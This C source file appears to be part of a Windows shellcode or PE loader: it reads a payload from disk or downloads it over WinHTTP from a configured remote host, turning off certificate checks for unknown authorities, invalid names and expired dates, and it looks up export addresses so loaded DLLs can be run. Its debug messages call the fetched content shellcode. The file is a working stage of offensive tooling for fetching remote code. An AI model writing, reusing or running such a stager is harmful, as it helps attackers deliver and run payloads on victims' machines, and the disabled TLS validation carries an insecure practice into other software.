#define _CRT_SECURE_NO_WARNINGS
#include "main.h"
#include "structs.h"
#include <stdio.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")


/*---------------------------
  Convert from char to wchar
---------------------------*/
SIZE_T CharStringToWCharString(PWCHAR Destination, PCHAR Source, SIZE_T  MaximumAllowed)
{
	INT Length = (INT)MaximumAllowed;

	while (--Length >= 0)
	{
		if (!(*Destination++ = *Source++))
			return MaximumAllowed - Length - 1;
	}

	return MaximumAllowed - Length;
}


/*------------------------------
  Read PE from disk, mainly
  for testing
------------------------------*/
#ifndef WEB
BOOL ReadF(const char* file_path, PDWORD file_size, PVOID* read_buffer) {
	FILE* file;

	file = fopen(file_path, "rb");
	if (file == NULL) {
		DEBUG_PRINT("[!] Error opening file: %s", file_path);
		*file_size = 0;
		return FALSE;
	}

	fseek(file, 0, SEEK_END);
	*file_size = ftell(file);
	rewind(file);

	*read_buffer = (char*)malloc(*file_size);
	if (*read_buffer == NULL) {
		DEBUG_PRINT("[!] Memory allocation failed");
		fclose(file);
		return FALSE;
	}

	fread(*read_buffer, 1, *file_size, file);
	DEBUG_PRINT("[*] Reading shellcode from disk with size: %d\n", *file_size);
	fclose(file);
	return TRUE;
}
#endif

/*--------------------------------
  Simple function find the address
  of an export func from the PE
  mainly for running DLLs
--------------------------------*/
PVOID FetchExportAddress(PIMAGE_DATA_DIRECTORY pEntryExpDir, ULONG_PTR pPeBaseAddr, LPCSTR funcName) {

	PIMAGE_EXPORT_DIRECTORY pExpDir = (PIMAGE_EXPORT_DIRECTORY)(pPeBaseAddr + pEntryExpDir->VirtualAddress);
	PDWORD pFuncNames = (PDWORD)(pPeBaseAddr + pExpDir->AddressOfNames);
	PDWORD pFuncAddrs = (PDWORD)(pPeBaseAddr + pExpDir->AddressOfFunctions);
	PWORD pFuncOrds = (PWORD)(pPeBaseAddr + pExpDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExpDir->NumberOfFunctions; i++) {
		CHAR* FuncName = (CHAR*)(pPeBaseAddr + pFuncNames[i]);
		PVOID funcAddress = (PVOID)(pPeBaseAddr + pFuncAddrs[pFuncOrds[i]]);

		if (strcmp(FuncName, funcName) == 0) {
			DEBUG_PRINT("[*] Found the address of: %s\n", funcName);
			return funcAddress;
		}
	}
	return NULL;
}


#ifdef WEB
BOOL Download(LPCWSTR url, LPCWSTR file, PCONTENT cnt) {


#ifdef SECURE
	unsigned int port = SECURE;
	DWORD secFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
		SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
		SECURITY_FLAG_IGNORE_UNKNOWN_CA;
	DWORD dwFlags = WINHTTP_FLAG_SECURE;

#elif !defined(SECURE)
	DWORD dwFlags = 0;
	unsigned int port = WEB;
#endif


	// Create a HTTP session
	HINTERNET hSession = WinHttpOpen(
		NULL,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		0
	);

	if (hSession) {
		// Connect to URL
		HINTERNET hConnect = WinHttpConnect(
			hSession,
			url,
			port,
			0
		);

		if (hConnect) {
			//Create a http request
			HINTERNET hRequest = WinHttpOpenRequest(
				hConnect,
				L"GET",
				file,
				NULL,
				WINHTTP_NO_REFERER,
				WINHTTP_DEFAULT_ACCEPT_TYPES,
				dwFlags
			);
#ifdef SECURE
			//SSL
			BOOL bRet = WinHttpSetOption(
				hRequest,
				WINHTTP_OPTION_SECURITY_FLAGS,
				&secFlags,
				sizeof(DWORD)
			);
#endif
			// Send the request
			if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
				//Parse the response
				if (WinHttpReceiveResponse(hRequest, NULL)) {
					DWORD Size = 0;
					DWORD Downloaded = 0;
					DWORD TotalSize = 0;
					LPSTR download_buffer = NULL;

					do {
						if (!WinHttpQueryDataAvailable(hRequest, &Size)) {
							DEBUG_PRINT("[!] Error %d in WinHttpQueryDataAvailable.\n", GetLastError());
						}

						if (Size > 0) {
							LPSTR temp_buffer = (LPSTR)malloc(Size);
							if (!temp_buffer) {
								DEBUG_PRINT("[!] Out of memory while downloading.\n");
								Size = 0;
								break;
							}

							if (WinHttpReadData(hRequest, (LPVOID)temp_buffer, Size, &Downloaded)) {
								LPSTR new_buffer = (LPSTR)realloc(download_buffer, TotalSize + Downloaded);
								if (!new_buffer) {
									DEBUG_PRINT("[!] Out of memory while reallocating buffer.\n");
									free(temp_buffer);
									Size = 0;
									break;
								}

								download_buffer = new_buffer;
								mymemcpy(download_buffer + TotalSize, temp_buffer, Downloaded);
								TotalSize += Downloaded;
							}

							free(temp_buffer);
						}
					} while (Size > 0);

					if (TotalSize > 0) {
						cnt->data = download_buffer;
						cnt->size = TotalSize;

						WinHttpCloseHandle(hRequest);
						WinHttpCloseHandle(hConnect);
						WinHttpCloseHandle(hSession);

						DEBUG_PRINT("[*] Downloaded the shellcode with size: %d\n", TotalSize);
						return TRUE;
					}
					else {
						free(download_buffer);
						DEBUG_PRINT("[!] Download failed!\n");
						return FALSE;
					}

				}
				WinHttpCloseHandle(hRequest);
			}
			WinHttpCloseHandle(hConnect);
		}
		WinHttpCloseHandle(hSession);
	}
	DEBUG_PRINT("[!] Download failed!\n");
	return FALSE;
}
#endif


/*--------------------------------------------
 Wrapper function to fetch the shellcode
 Either from disk or on the webserver
--------------------------------------------*/
BOOL GetPE(PCONTENT cnt) {

#ifdef WEB
	if (!Download((LPCWSTR)HOST, (LPCWSTR)REMOTE_FILE, cnt)) {
		DEBUG_PRINT(L"[!] Failed downloading %s from %s.\n", HOST, REMOTE_FILE);
		return FALSE;
	}

#elif !defined(WEB)
	if (!ReadF(LOCAL_FILE, &(cnt->size), &(cnt->data))) {
		DEBUG_PRINT("[!] Failed reading the shellcode from disk.\n");
		return FALSE;
	}
#endif
	return TRUE;
}